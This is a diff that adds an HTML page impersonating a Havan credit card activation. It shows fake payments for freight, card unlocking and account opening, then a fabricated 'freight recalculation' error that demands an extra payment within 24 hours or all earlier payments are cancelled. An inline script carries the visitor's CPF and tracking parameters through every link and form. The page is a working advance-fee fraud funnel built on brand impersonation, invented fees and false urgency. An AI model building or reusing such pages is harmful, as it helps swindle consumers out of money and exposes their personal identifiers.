@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Havan Card - Finalizando Ativação</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="upsell-styles.css">
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="loading-screen">
+        <div class="loading-container">
+            <div class="havan-logo">
+                <div class="logo-circle">
+                    <span class="logo-text">H</span>
+                </div>
+                <h2>HAVAN</h2>
+            </div>
+            
+            <div class="loading-content">
+                <h3>Finalizando Ativação do Cartão</h3>
+                <p>Processando pagamentos realizados...</p>
+                
+                <div class="progress-steps">
+                    <div class="step" id="step1">
+                        <div class="step-icon">
+                            <i class="fas fa-truck"></i>
+                        </div>
+                        <div class="step-text">
+                            <span class="step-title">Pagamento do Frete</span>
+                            <span class="step-status" id="status1">Verificando...</span>
+                        </div>
+                        <div class="step-loader" id="loader1">
+                            <div class="spinner"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="step" id="step2">
+                        <div class="step-icon">
+                            <i class="fas fa-unlock-alt"></i>
+                        </div>
+                        <div class="step-text">
+                            <span class="step-title">Pagamento do Desbloqueio</span>
+                            <span class="step-status" id="status2">Aguardando...</span>
+                        </div>
+                        <div class="step-loader" id="loader2">
+                            <div class="spinner"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="step" id="step3">
+                        <div class="step-icon">
+                            <i class="fas fa-building"></i>
+                        </div>
+                        <div class="step-text">
+                            <span class="step-title">Abertura de Conta</span>
+                            <span class="step-status" id="status3">Aguardando...</span>
+                        </div>
+                        <div class="step-loader" id="loader3">
+                            <div class="spinner"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="delivery-info" id="deliveryInfo" style="display: none;">
+                    <div class="delivery-icon">
+                        <i class="fas fa-shipping-fast"></i>
+                    </div>
+                    <div class="delivery-text">
+                        <h4>Cartão a Caminho!</h4>
+                        <p>Seu cartão Havan será entregue em <strong>23 horas</strong></p>
+                        <div class="countdown" id="countdown">22:59:45</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Screen -->
+    <div id="successScreen" class="success-screen" style="display: none;">
+        <div class="success-container">
+            <div class="header">
+                <div class="havan-brand">
+                    <div class="brand-logo">
+                        <span>H</span>
+                    </div>
+                    <span class="brand-name">HAVAN</span>
+                </div>
+            </div>
+            
+            <div class="success-content">
+                <div class="success-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                
+                <h2>Cartão Ativado com Sucesso!</h2>
+                <p>Seu cartão Havan está pronto para uso e será entregue em breve.</p>
+                
+                <div class="summary-box">
+                    <h3>Resumo dos Pagamentos</h3>
+                    <div class="payment-item">
+                        <span>Frete de Entrega</span>
+                        <span>R$ 28,82</span>
+                    </div>
+                    <div class="payment-item">
+                        <span>Desbloqueio do Cartão</span>
+                        <span>R$ 18,82</span>
+                    </div>
+                    <div class="payment-item">
+                        <span>Abertura de Conta</span>
+                        <span>R$ 22,62</span>
+                    </div>
+                    <div class="payment-total">
+                        <span>Total Pago</span>
+                        <span>R$ 60,26</span>
+                    </div>
+                </div>
+                
+                <div class="delivery-status">
+                    <div class="status-icon">
+                        <i class="fas fa-truck"></i>
+                    </div>
+                    <div class="status-text">
+                        <h4>Entrega Programada</h4>
+                        <p>Seu cartão chegará em <span id="deliveryTime">23 horas</span></p>
+                        <div class="progress-bar">
+                            <div class="progress-fill"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="continue-btn" onclick="checkAccount()">
+                    <i class="fas fa-arrow-right"></i>
+                    ACESSAR MINHA CONTA
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Error Screen -->
+    <div id="errorScreen" class="error-screen" style="display: none;">
+        <div class="error-container">
+            <div class="header error-header">
+                <div class="havan-brand">
+                    <div class="brand-logo">
+                        <span>H</span>
+                    </div>
+                    <span class="brand-name">HAVAN</span>
+                </div>
+            </div>
+            
+            <div class="error-content">
+                <div class="error-alert">
+                    <div class="error-icon">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <div class="error-text">
+                        <h2>Reanálise de Frete Necessária</h2>
+                        <p>Detectamos uma inconsistência no cálculo do frete. O valor foi cobrado incorretamente.</p>
+                    </div>
+                </div>
+                
+                <div class="freight-info">
+                    <h3>Problema Identificado</h3>
+                    <div class="problem-details">
+                        <div class="detail-item">
+                            <i class="fas fa-map-marker-alt"></i>
+                            <span>Distância para entrega maior que o calculado</span>
+                        </div>
+                        <div class="detail-item">
+                            <i class="fas fa-weight-hanging"></i>
+                            <span>Peso do cartão com embalagem especial</span>
+                        </div>
+                        <div class="detail-item">
+                            <i class="fas fa-shield-alt"></i>
+                            <span>Seguro obrigatório para entrega expressa</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="freight-correction">
+                    <div class="correction-box">
+                        <div class="correction-item">
+                            <span>Frete Pago Anteriormente:</span>
+                            <span class="old-price">R$ 28,82</span>
+                        </div>
+                        <div class="correction-item">
+                            <span>Valor Correto do Frete:</span>
+                            <span class="new-price">R$ 48,24</span>
+                        </div>
+                        <div class="correction-total">
+                            <span>Complemento Necessário:</span>
+                            <span class="complement-price">R$ 19,42</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="warning-box">
+                    <div class="warning-icon">
+                        <i class="fas fa-clock"></i>
+                    </div>
+                    <div class="warning-text">
+                        <h4>Ação Necessária em 24 horas</h4>
+                        <p>Caso o complemento não seja pago, <strong>todos os pagamentos serão cancelados</strong> e o cartão não será enviado.</p>
+                    </div>
+                </div>
+                
+                <div class="benefits-reminder">
+                    <h4>Após o pagamento do complemento:</h4>
+                    <div class="benefit-list">
+                        <div class="benefit">
+                            <i class="fas fa-check"></i>
+                            <span>Cartão enviado imediatamente</span>
+                        </div>
+                        <div class="benefit">
+                            <i class="fas fa-check"></i>
+                            <span>Entrega garantida em 23 horas</span>
+                        </div>
+                        <div class="benefit">
+                            <i class="fas fa-check"></i>
+                            <span>Limite de R$ 4.700,00 ativo</span>
+                        </div>
+                        <div class="benefit">
+                            <i class="fas fa-check"></i>
+                            <span>Conta Havan totalmente funcional</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="freight-payment-btn" onclick="window.location.href='/funil/pos/up3check/'+window.location.search">
+                    <i class="fas fa-truck"></i>
+                    PAGAR COMPLEMENTO DO FRETE
+                </button>
+                
+                <p class="urgency-note">
+                    <i class="fas fa-exclamation-circle"></i>
+                    Pagamento urgente para não perder o cartão
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script defer src="upsell-script.js"></script>
+
+<script>
+(function() {
+    function updateAllLinksAndForms() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const utms = {};
+        urlParams.forEach((value, key) => {
+            if (key.startsWith('utm_') || key === 'cpf' || key === 'fbclid' || key === 'gclid') {
+                utms[key] = value;
+            }
+        });
+
+        if (Object.keys(utms).length === 0) return;
+
+        document.querySelectorAll('a').forEach(link => {
+            try {
+                const href = link.getAttribute('href');
+                if (!href || href.startsWith('#') || href.startsWith('javascript:')) return;
+                
+                let url;
+                try {
+                    url = new URL(href, window.location.origin);
+                } catch(e) {
+                    const separator = href.includes('?') ? '&' : '?';
+                    const linkParams = new URLSearchParams();
+                    Object.keys(utms).forEach(key => linkParams.set(key, utms[key]));
+                    link.href = href + separator + linkParams.toString();
+                    return;
+                }
+
+                if (url.origin === window.location.origin || href.startsWith('.') || href.startsWith('/')) {
+                    const linkParams = new URLSearchParams(url.search);
+                    Object.keys(utms).forEach(key => linkParams.set(key, utms[key]));
+                    url.search = linkParams.toString();
+                    link.href = url.toString();
+                }
+            } catch (e) {}
+        });
+
+        document.querySelectorAll('form').forEach(form => {
+            Object.keys(utms).forEach(key => {
+                let input = form.querySelector(`input[name="${key}"]`);
+                if (!input) {
+                    input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    form.appendChild(input);
+                }
+                input.value = utms[key];
+            });
+        });
+    }
+
+    updateAllLinksAndForms();
+    window.addEventListener('load', updateAllLinksAndForms);
+    document.addEventListener('DOMContentLoaded', updateAllLinksAndForms);
+    const observer = new MutationObserver(updateAllLinksAndForms);
+    observer.observe(document.documentElement, { childList: true, subtree: true });
+})();
+</script>
+
+</body>
+</html>
